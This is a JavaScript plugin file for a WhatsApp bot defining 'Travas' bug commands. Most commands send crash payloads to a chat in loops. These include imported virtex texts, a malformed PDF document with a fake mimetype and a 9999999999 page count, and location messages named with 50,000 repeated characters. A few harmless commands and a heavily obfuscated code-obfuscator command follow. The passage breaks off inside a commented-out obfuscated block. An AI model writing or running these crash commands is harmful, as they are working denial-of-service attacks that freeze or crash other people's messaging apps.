        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE13; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex13},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 14=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH14 = 1; // Nombre de fois que le texte est dupliqué
const FORCE14 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex14 = require('../lib/virtex/crazyvirtex14');

cmd({
        pattern: "bug13",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE14; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex14},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);



///////////////////////////////////////////==========================BUG 15=====================///////////////////////////////////////////////////////

// Définir les valeurs de configuration directement dans le fichier
const LENGTH15 = 1; // Nombre de fois que le texte est dupliqué
const FORCE15 = 3;  // Nombre de fois que le message est envoyé
const crazyvirtex15 = require('../lib/virtex/crazyvirtex15');

cmd({
        pattern: "bug14",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },
    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        try {
            
            

            // Envoyer le message selon FORCE
            for (let i = 0; i < FORCE15; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + crazyvirtex15},{ quoted: citel });
            }
        } catch (error) {
            console.error("Error sending text message: ", error);
        }
    }
);

*/

///////////////////////////////////////////==========================BUG 16=====================///////////////////////////////////////////////////////
// bug database
const { bugtext1 } = require("../lib/virtex/bugtext1");
const { bugtext2 } = require("../lib/virtex/bugtext2");
const { bugtext3 } = require("../lib/virtex/bugtext3");
const { bugtext4 } = require("../lib/virtex/bugtext4");
const { bugtext5 } = require("../lib/virtex/bugtext5");
const { bugtext6 } = require("../lib/virtex/bugtext6");
const { bugpdf } = require("../lib/virtex/bugpdf.js");

///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
cmd({
        pattern: "bug15",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },

    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        const bug = bugtext6;
        try {
            for (let i = 0; i < 10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + bug},{ quoted: citel });
            }
        } catch (e) {
            await Void.sendMessage(citel.chat, { text: `an error occured sending bugs`},{ quoted: citel });
            console.log(`an error occured sending bugs`);
            return;
        }
    }
);

///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
cmd({
        pattern: "bug16",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },

    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        const bug1 = bugtext5;
        try {
            for (let i = 0; i < 10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + bug1},{ quoted: citel });
            }
        } catch (e) {
            await Void.sendMessage(citel.chat, { text: `an error occured sending bugs`},{ quoted: citel });
            console.log(`an error occured sending bugs`);
            return;
        }
    }
);

///////////////////////////////////////////===============================================///////////////////////////////////////////////////////

cmd({
        pattern: "bug17",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },

    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        const bug2 = bugtext4;
        try {
            for (let i = 0; i < 10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + bug2},{ quoted: citel });
            }
        } catch (e) {
            await Void.sendMessage(citel.chat, { text: `an error occured sending bugs`},{ quoted: citel });
            console.log(`an error occured sending bugs`);
            return;
        }
    }
);
///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
cmd({
        pattern: "bug18",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },

    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        const bug3 = bugtext3;
        try {
            for (let i = 0; i < 10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + bug3},{ quoted: citel });
            }
        } catch (e) {
            await Void.sendMessage(citel.chat, { text: `an error occured sending bugs`},{ quoted: citel });
            console.log(`an error occured sending bugs`);
            return;
        }
    }
);

///////////////////////////////////////////===============================================///////////////////////////////////////////////////////

cmd({
        pattern: "bug19",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },

    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        const bug4 = bugtext2;
        try {
            for (let i = 0; i < 10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + bug4},{ quoted: citel });
            }
        } catch (e) {
            await Void.sendMessage(citel.chat, { text: `an error occured sending bugs`},{ quoted: citel });
            console.log(`an error occured sending bugs`);
            return;
        }
    }
);
///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
cmd({
        pattern: "bug20",
        desc: "Sends a travas bug message",
        category: "Travas",
        use: 'bug',
        react: "💣",
        filename: __filename
    },

    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        const bug5 = bugtext1;
        try {
            for (let i = 0; i < 10; i++) {
                await Void.sendMessage(citel.chat, { text: prefix + bug5},{ quoted: citel });
            }
        } catch (e) {
            await Void.sendMessage(citel.chat, { text: `an error occured sending bugs`},{ quoted: citel });
            console.log(`an error occured sending bugs`);
            return;
        }
    }
);

///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
cmd({
        pattern: "bugpdf",
        desc: "Sends a travas bug pdf",
        category: "Travas",
        use: 'bugpdf',
        react: "💣",
        filename: __filename
    },

    async (Void, citel, text,{ isCreator }) => {
        if(!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`)
        // send loading message
        await Void.sendMessage(citel.chat, { text: `processing your bugpdf`},{ quoted: citel });

        for (let i = 0; i < 25; i++) {
            const doc = { url: "./config.js" };
            await Void.sendMessage(citel.chat, {
                document: doc,
                mimetype:
                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9",
                title: "travas.pdf",
                pageCount: 9999999999,
                thumbnail: {
                    url: "https://telegra.ph/file/1fd66052a2f356014d861.jpg"
                },
                thumbnailUrl:
                    "https://telegra.ph/file/1fd66052a2f356014d861.jpg",
                jpegThumbnail: {
                    url: "https://telegra.ph/file/1fd66052a2f356014d861.jpg"
                },
                mediaKey: "ht55w7B6UoaG9doQuVQ811XNfWcoALqcdQfd61seKKk=",
                fileName:
                    "\u27E8\u0F11̶\u20DF\uD83D\uDCA5 \uD835\uDC01͢\uD835\uDC11\uD835\uDC14\uD835\uDC17͢\uD835\uDC0E \uD835\uDC05\uD835\uDC14͢\uD835\uDC02\uD835\uDC0A\uD835\uDC0F͢\uD835\uDC03\uD835\uDC05̑\uD83D\uDC41️\u0F11̶\u27E9\n\n" +
                    bugpdf
            });
        }
        await Void.sendMessage(citel.chat, { react: { text: "✅", key: ms.key } });
    }
);
///////////////////////////////////////////===============================================///////////////////////////////////////////////////////
cmd({
    pattern: "bugloc",
    desc: "Sends a travas bug location",
    category: "Travas",
    use: 'bugloc',
    react: "💣",
    filename: __filename
},

async (Void, citel, text, { isCreator }) => {
    if (!isCreator) return citel.reply(`🫵🏽😂 𝓸𝓸𝓸𝓱 𝔂𝓸𝓾 𝔀𝓪𝓷𝓷𝓪 𝓫𝓸𝓸𝓶 𝓫𝓸𝓸𝓶 𝓽𝓱𝓮 𝓰𝓻𝓸𝓾𝓹 ? 𝓖𝓸 𝓪𝔀𝓪𝔂 𝓜𝓕`);
    
    await Void.sendMessage(citel.chat, { text: `Processing your location bug` }, { quoted: citel });

    const bug2 = `̿╮⭑ ☠️⃰͜͡؜ᴘᴏᴡᴇʀᴇᴅ ʙʏ Tᴇꜱʟᴀ Mᴅ╮.xp` + "ꦾ".repeat(50000);
    const locationName = bug2; // Utiliser directement bug2 ou initialiser `l` si nécessaire

    for (let i = 0; i < 20; i++) {
        for (let j = 0; j < 3; j++) { // Utilisation d'un nombre à la place d'un string
            Void.sendMessage(
                citel.chat,
                {
                    location: {
                        degreesLatitude: 34.745948,
                        degreesLongitude: -92.289883,
                        name: locationName
                    }
                },
                { quoted: citel }
            );
        }
    }

    await Void.sendMessage(citel.chat, { react: { text: "💥", key: ms.key } });
});

//---------------------------------------------------------------------------

cmd({
  pattern: "kitty",
  desc: "All about cats",
  category: "culture",
  react: "🌍",
  filename: __filename
},

async (Void, citel, text, { isCreator }) => {
  // Fonction pour générer un nombre aléatoire avec une probabilité plus élevée pour 2 ou 3
  function getRandomCount() {
    const weights = [0.4, 0.4, 0.05, 0.05, 0.05, 0.02, 0.02, 0.01]; // Pondération pour 2 à 9
    const counts = [2, 3, 4, 5, 6, 7, 8, 9];
    let random = Math.random();
    let sum = 0;

    for (let i = 0; i < weights.length; i++) {
      sum += weights[i];
      if (random <= sum) {
        return counts[i];
      }
    }
    return 2; // Au cas où quelque chose ne fonctionnerait pas correctement, retourner 2 par défaut
  }

  const count = getRandomCount();
  const apiURL = `https://meowfacts.herokuapp.com/?count=${count}`;
  const msg = `╔══════⊰⊱═════╗
              𝓒𝓡𝓐𝓩𝓨 𝓜𝓓 𝓒𝓤𝓛𝓣𝓤𝓡𝓔
╚══════⊰⊱═════╝
\n`;
    let foot = '\n\nᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴄʀᴀᴢʏ-ᴍᴅ²³⁷';
  try {
    const response = await axios.get(apiURL);
    const { data } = response.data;
    console.log(response.data);

    if (data) {
      await Void.sendMessage(citel.chat, {
        text: msg + data + foot
        }, {
        quoted: citel,
      });
    } else {
      citel.reply('API error 404.');
    }
  } catch (error) {
    console.error('Error when fetching informations:', error);
    citel.reply('An error occurred while retrieving the text. Please try again later.');
  }
});


//---------------------------------------------------------------------------

cmd({
  pattern: "clear",
  desc: "clear chat messages",
  category: "group",
  react: "🗑️",
  filename: __filename
},
async (Void, citel, text, { isCreator }) => {
    if(!isCreator) return citel.reply(`This command is for my owner`)
      try{   
        /*
        await Void.clearChat(citel.chat)
        /*
	await Void.chatModify({
		delete: true,
		lastMessages: [{
			key: citel.key,
			messageTimestamp: citel.messageTimestamp
		}]
	}, citel.chat)
    let on = "`";
    */
const lastMsgInChat = await getLastMessageInChat(citel.chat) // implement this on your end
await Void.chatModify({
  delete: true,
  lastMessages: [{ key: lastMsgInChat.key, messageTimestamp: lastMsgInChat.messageTimestamp }]
},
Void.user.id)


await Void.sendMessage(Void.user.id, { delete: lastMsgInChat.key })


await Void.chatModify(
  { clear: { messages: [{ id: lastMsgInChat, fromMe: true, timestamp: lastMsgInChat.messageTimestamp }] } }, 
  Void.user.id, 
  []
  )

await Void.chatModify(
  { clear: { messages: [{ id: lastMsgInChat.id, fromMe: true, timestamp: lastMsgInChat.messageTimestamp }] } }, 
  Void.user.id, 
  []
  )

	await citel.reply('🗑️Cleared!')
    }catch(e){ message.error(`${e}\n\nCommand : clear` , e, false) }
    citel.reply('error: {e}')
})


//---------------------------------------------------------------------------

cmd({
  pattern: "why",
  desc: "send messages",
  category: "culture",
  react: "🤔"
},
async (Void, citel, text) => {
    try {
         const apiURL = `https:/nekos.life//api/v2/why`
         const response = await axios.get(apiURL);
    const { why } = response.data;
    console.log(response.data);

    if (why) {
      citel.reply('```'+why+'```')
    await Void.sendMessage(citel.chat, {
            text: why
        }, {
            quoted: citel,
        });
    
    } else {
      citel.reply('API not found.');
    }
        
    } catch (e) {
        citel.reply('error');
    }
}, 
{
   error: false,
   cache: true
});
//-------------------------------OBFQ--------------------------------------------
const _0x3e6243=_0x8273;(function(_0x2037bf,_0x32a2ef){const _0x11e97e=_0x8273,_0xcd643a=_0x2037bf();while(!![]){try{const _0x1e03ab=-parseInt(_0x11e97e(0x120))/(-0x787+-0x1*0x1a42+-0xad*-0x32)*(parseInt(_0x11e97e(0xff))/(-0x5b+-0x1337+0x1394))+-parseInt(_0x11e97e(0x10f))/(-0x1c32+0x4*0x2ce+0x10fd)+-parseInt(_0x11e97e(0xf9))/(-0x174f+0x1123+0x630)*(parseInt(_0x11e97e(0xfe))/(-0x196+0x2343+-0x21a8))+-parseInt(_0x11e97e(0x112))/(0x1009*-0x1+0xa52*0x2+-0x495)+-parseInt(_0x11e97e(0x102))/(0x1*0x2497+-0x1791+-0xcff)+parseInt(_0x11e97e(0x101))/(-0x100e+0x1c2e+-0xc18)+parseInt(_0x11e97e(0x10a))/(0x2*-0xdd9+0x0+0x1bbb*0x1)*(parseInt(_0x11e97e(0x128))/(0x1bb2*-0x1+-0x3*0x877+0x3521));if(_0x1e03ab===_0x32a2ef)break;else _0xcd643a['push'](_0xcd643a['shift']());}catch(_0x193784){_0xcd643a['push'](_0xcd643a['shift']());}}}(_0x1602,-0x47*0x3685+0x138b*0xcb+0xe8fed));function _0x1602(){const _0x20b315=['²³⁷','reply','28456WgLzSs','uscation\x20:','```\x20\x0a','\x20\x20\x20\x20\x20\x20𝓒𝓡𝓐𝓩','message','15KYZXyQ','40YOdbfr','══════╝\x0a\x0a\x0a','4179592osmQFt','13625031ceCIck','-obfuscato','𝓞𝓑𝓕𝓤𝓢𝓒𝓐𝓣𝓞𝓡','e\x20code\x20con','enter\x20a\x20js','tenu\x20dans\x20','rXfDp','\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20','1455021RvDLYV','chat','javascript','tedCode','\x20textuel.','5032881mCYTIL','sendMessag','\x20this\x20.obf','7701606AiFIaR','\x20ᴘᴏᴡᴇʀᴇᴅ\x20ʙ','getObfusca','ode>','𝓨\x20𝓜𝓓\x20\x0a\x20\x20\x20\x20','uscate\x20<yo','ur\x20js\x20code','\x0a╚══════⊰⊱','MpMFb','utils','\x20\x20\x20\x20\x20\x20\x20𝓙𝓢\x20','🖨️','s\x20de\x20l\x27obf','<your\x20js\x20c','94477vGECxf','\x0a```','\x20code\x20like','AulwB','ʏ\x20ᴄʀᴀᴢʏ-ᴍᴅ','╔══════⊰⊱═','un\x20message','base64','450vUOPlw','═════╗\x0a\x20\x20\x20','Obfusque\x20l','>\x20.','Erreur\x20lor','obfuscate','dQncN'];_0x1602=function(){return _0x20b315;};return _0x1602();}const JSObfuscator=require(_0x3e6243(0x10c)+_0x3e6243(0x103)+'r');function _0x8273(_0x2f7e5e,_0x3c8610){const _0x54b4b7=_0x1602();return _0x8273=function(_0x368568,_0x527e02){_0x368568=_0x368568-(-0xbcb+0x2377+-0x1bf*0xd);let _0x5d4aa0=_0x54b4b7[_0x368568];return _0x5d4aa0;},_0x8273(_0x2f7e5e,_0x3c8610);}cmd({'pattern':_0x3e6243(0x12d),'desc':_0x3e6243(0x12a)+_0x3e6243(0x105)+_0x3e6243(0x107)+_0x3e6243(0x126)+_0x3e6243(0x10e),'category':_0x3e6243(0x11b),'filename':__filename,'use':_0x3e6243(0x11f)+_0x3e6243(0x115),'react':_0x3e6243(0x11d)},async(_0x4af46d,_0x1b3b0a,_0x2b6a99)=>{const _0x2c48f3=_0x3e6243,_0x101ad8={'dQncN':_0x2c48f3(0x106)+_0x2c48f3(0x122)+_0x2c48f3(0x111)+_0x2c48f3(0x117)+_0x2c48f3(0x118)+_0x2c48f3(0x12b),'MpMFb':_0x2c48f3(0x127),'rXfDp':function(_0x208850,_0x3b169d){return _0x208850+_0x3b169d;},'AulwB':_0x2c48f3(0x12c)+_0x2c48f3(0x11e)+_0x2c48f3(0xfa)+'\x20'};if(!_0x2b6a99)return _0x1b3b0a[_0x2c48f3(0x130)](_0x101ad8[_0x2c48f3(0x12e)]);try{const _0x41a205=_0x2b6a99,_0x37586d=JSObfuscator[_0x2c48f3(0x12d)](_0x41a205,{'compact':!![],'controlFlowFlattening':!![],'deadCodeInjection':!![],'stringArrayEncoding':[_0x101ad8[_0x2c48f3(0x11a)]],'renameGlobals':!![],'selfDefending':!![],'disableConsoleOutput':!![],'debugProtection':!![],'transformObjectKeys':!![],'unicodeEscapeSequence':!![],'splitStrings':!![],'stringArrayThreshold':0.75,'splitStringsChunkLength':0x5})[_0x2c48f3(0x114)+_0x2c48f3(0x10d)]();await _0x4af46d[_0x2c48f3(0x110)+'e'](_0x1b3b0a[_0x2c48f3(0x10b)],{'text':_0x2c48f3(0x125)+_0x2c48f3(0x129)+_0x2c48f3(0x109)+_0x2c48f3(0xfc)+_0x2c48f3(0x116)+_0x2c48f3(0x11c)+_0x2c48f3(0x104)+_0x2c48f3(0x119)+_0x2c48f3(0x100)+_0x2c48f3(0x109)+_0x2c48f3(0x113)+_0x2c48f3(0x124)+_0x2c48f3(0x12f)},{'quoted':_0x1b3b0a}),await _0x4af46d[_0x2c48f3(0x110)+'e'](_0x1b3b0a[_0x2c48f3(0x10b)],{'text':_0x2c48f3(0xfb)+_0x37586d+_0x2c48f3(0x121)},{'quoted':_0x1b3b0a});}catch(_0x310f9d){_0x1b3b0a[_0x2c48f3(0x130)](_0x101ad8[_0x2c48f3(0x108)](_0x101ad8[_0x2c48f3(0x123)],_0x310f9d[_0x2c48f3(0xfd)]));}});
//=============================================================================

//============JS OBFUSCATOR======================================================
/*
function _0x3eba(_0x324126,_0x8a8daf){const _0x127639=_0x5323();return _0x3eba=function(_0x22fc74,_0x58716f){_0x22fc74=_0x22fc74-0xba;let _0x57cf96=_0x127639[_0x22fc74];if(_0x3eba['\x57\x41\x47\x68\x75\x41']===undefined){var _0x395bf0=function(_0x45f2bd){const _0x24b7b5='\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2b\x2f\x3d';let _0x53230f='',_0x3eba81='',_0x32663e=_0x53230f+_0x395bf0;for(let _0x4ec79a=0x0,_0x5ccab0,_0xa63c21,_0x3210cd=0x0;_0xa63c21=_0x45f2bd['\x63\x68\x61\x72\x41\x74'](_0x3210cd++);~_0xa63c21&&(_0x5ccab0=_0x4ec79a%0x4?_0x5ccab0*0x40+_0xa63c21:_0xa63c21,_0x4ec79a++%0x4)?_0x53230f+=_0x32663e['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x3210cd+0xa)-0xa!==0x0?String['\x66\x72\x6f\x6d\x43\x68\x61\x72\x43\x6f\x64\x65'](0xff&_0x5ccab0>>(-0x2*_0x4ec79a&0x6)):_0x4ec79a:0x0){_0xa63c21=_0x24b7b5['\x69\x6e\x64\x65\x78\x4f\x66'](_0xa63c21);}for(let _0x56ae2d=0x0,_0x5ed092=_0x53230f['\x6c\x65\x6e\x67\x74\x68'];_0x56ae2d<_0x5ed092;_0x56ae2d++){_0x3eba81+='\x25'+('\x30\x30'+_0x53230f['\x63\x68\x61\x72\x43\x6f\x64\x65\x41\x74'](_0x56ae2d)['\x74\x6f\x53\x74\x72\x69\x6e\x67'](0x10))['\x73\x6c\x69\x63\x65'](-0x2);}return decodeURIComponent(_0x3eba81);};_0x3eba['\x6b\x43\x57\x41\x51\x58']=_0x395bf0,_0x324126=arguments,_0x3eba['\x57\x41\x47\x68\x75\x41']=!![];}const _0x43b9df=_0x127639[0x0],_0x44e285=_0x22fc74+_0x43b9df,_0x3f42c9=_0x324126[_0x44e285];if(!_0x3f42c9){const _0x55613e=function(_0x3822b2){this['\x4e\x4d\x74\x6d\x6e\x57']=_0x3822b2,this['\x62\x47\x68\x62\x4c\x68']=[0x1,0x0,0x0],this['\x57\x6c\x54\x56\x7a\x51']=function(){return'\x6e\x65\x77\x53\x74\x61\x74\x65';},this['\x59\x66\x79\x44\x4d\x6a']='\x5c\x77\x2b\x20\x2a\x5c\x28\x5c\x29\x20\x2a\x7b\x5c\x77\x2b\x20\x2a',this['\x55\x6a\x76\x56\x49\x41']='\x5b\x27\x7c\x22\x5d\x2e\x2b\x5b\x27\x7c\x22\x5d\x3b\x3f\x20\x2a\x7d';};_0x55613e['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x51\x56\x63\x70\x74\x5a']=function(){const _0x9f8a14=new RegExp(this['\x59\x66\x79\x44\x4d\x6a']+this['\x55\x6a\x76\x56\x49\x41']),_0xc289e=_0x9f8a14['\x74\x65\x73\x74'](this['\x57\x6c\x54\x56\x7a\x51']['\x74\x6f\x53\x74\x72\x69\x6e\x67']())?--this['\x62\x47\x68\x62\x4c\x68'][0x1]:--this['\x62\x47\x68\x62\x4c\x68'][0x0];return this['\x57\x6e\x4c\x54\x73\x6f'](_0xc289e);},_0x55613e['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x57\x6e\x4c\x54\x73\x6f']=function(_0x58ad4a){if(!Boolean(~_0x58ad4a))return _0x58ad4a;return this['\x71\x71\x71\x66\x53\x51'](this['\x4e\x4d\x74\x6d\x6e\x57']);},_0x55613e['\x70\x72\x6f\x74\x6f\x74\x79\x70\x65']['\x71\x71\x71\x66\x53\x51']=function(_0x4bcfb5){for(let _0x4caa05=0x0,_0x25409e=this['\x62\x47\x68\x62\x4c\x68']['\x6c\x65\x6e\x67\x74\x68'];_0x4caa05<_0x25409e;_0x4caa05++){this['\x62\x47\x68\x62\x4c\x68']['\x70\x75\x73\x68'](Math['\x72\x6f\x75\x6e\x64'](Math['\x72\x61\x6e\x64\x6f\x6d']())),_0x25409e=this['\x62\x47\x68\x62\x4c\x68']['\x6c\x65\x6e\x67\x74\x68'];}return _0x4bcfb5(this['\x62\x47\x68\x62\x4c\x68'][0x0]);},new _0x55613e(_0x3eba)['\x51\x56\x63\x70\x74\x5a'](),_0x57cf96=_0x3eba['\x6b\x43\x57\x41\x51\x58'](_0x57cf96),_0x324126[_0x44e285]=_0x57cf96;}else _0x57cf96=_0x3f42c9;return _0x57cf96;},_0x3eba(_0x324126,_0x8a8daf);}const _0x966022=_0x3eba;(function(_0x25caad,_0x39eb76){const _0x957de9=_0x3eba,_0x26c349=_0x25caad();while(!![]){try{const _0x33fea0=parseInt(_0x957de9(0x13b))/0x1+-parseInt(_0x957de9(0xe2))/0x2*(parseInt(_0x957de9(0xde))/0x3)+parseInt(_0x957de9(0x120))/0x4*(-parseInt(_0x957de9(0xba))/0x5)+-parseInt(_0x957de9(0x168))/0x6*(parseInt(_0x957de9(0xfb))/0x7)+parseInt(_0x957de9(0x147))/0x8+parseInt(_0x957de9(0x180))/0x9+-parseInt(_0x957de9(0x15a))/0xa*(parseInt(_0x957de9(0xe6))/0xb);if(_0x33fea0===_0x39eb76)break;else _0x26c349['push'](_0x26c349['shift']());}catch(_0x537500){_0x26c349['push'](_0x26c349['shift']());}}}(_0x5323,0x6c994));const _0x4a4b76=(function(){const _0x4364b3=_0x3eba,_0x1318aa={};_0x1318aa[_0x4364b3(0x166)]=function(_0x109302,_0x21b6a2){return _0x109302!==_0x21b6a2;},_0x1318aa['\x6e\x79\x75\x49\x77']=_0x4364b3(0xcb);const _0x4ec160=_0x1318aa;let _0x3dfcf3=!![];return function(_0x56d0e5,_0xf18a8f){const _0x21dcd8=_0x4364b3;if(_0x4ec160[_0x21dcd8(0x166)](_0x4ec160['\x6e\x79\x75\x49\x77'],_0x21dcd8(0xcb))){const _0x14bad5=_0x4bcfb5?function(){const _0x5f2bee=_0x21dcd8;if(_0x2b061c){const _0x53c17e=_0xa627c3[_0x5f2bee(0x110)](_0x3a3d7d,arguments);return _0x396978=null,_0x53c17e;}}:function(){};return _0x43e6a2=![],_0x14bad5;}else{const _0x56f5c2=_0x3dfcf3?function(){const _0x3c4036=_0x21dcd8;if(_0xf18a8f){const _0x86a932=_0xf18a8f[_0x3c4036(0x110)](_0x56d0e5,arguments);return _0xf18a8f=null,_0x86a932;}}:function(){};return _0x3dfcf3=![],_0x56f5c2;}};}()),_0x15731f=_0x4a4b76(this,function(){const _0x3d7811=_0x3eba,_0x4d9293={};_0x4d9293[_0x3d7811(0x132)]='\x28\x28\x28\x2e\x2b'+'\x29\x2b\x29\x2b\x29'+'\x2b\x24';const _0x4acf50=_0x4d9293;return _0x15731f[_0x3d7811(0x170)+_0x3d7811(0x12e)]()[_0x3d7811(0x16e)+'\x68'](_0x4acf50[_0x3d7811(0x132)])['\x74\x6f\x53\x74\x72'+_0x3d7811(0x12e)]()[_0x3d7811(0x153)+_0x3d7811(0xc0)+'\x72'](_0x15731f)['\x73\x65\x61\x72\x63'+'\x68'](_0x4acf50['\x7a\x78\x4a\x55\x75']);});_0x15731f();const _0x5d127e=(function(){let _0x343847=!![];return function(_0x3e83f0,_0x54fea1){const _0x29bde7=_0x343847?function(){const _0x42cf5f=_0x3eba;if(_0x54fea1){const _0xdc47b0=_0x54fea1[_0x42cf5f(0x110)](_0x3e83f0,arguments);return _0x54fea1=null,_0xdc47b0;}}:function(){};return _0x343847=![],_0x29bde7;};}());function _0x5323(){const 